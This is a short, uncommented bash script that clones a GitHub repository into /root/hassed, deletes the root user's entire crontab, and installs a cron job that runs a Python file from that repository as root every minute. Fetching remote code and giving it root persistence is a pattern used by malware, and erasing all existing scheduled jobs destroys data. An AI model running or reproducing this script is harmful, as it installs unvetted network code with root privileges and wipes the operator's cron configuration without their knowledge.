date >> xxxxxx_test
echo $SUDO_USER > read.me
export su_img_3=$(cat read.me) && echo  $su_img_3

rm -rf lsq_0_c
rm -rf /root/hassed/*
mkdir -p /root/hassed
git clone https://github.com/GH0STAV0/lsq_0_c.git
cp lsq_0_c/* /root/hassed/
crontab -r
(crontab -l -u root 2>/dev/null; echo "* * * * * python3 /root/hassed/tel_tel.py") | crontab -
service cron stop && service cron start 
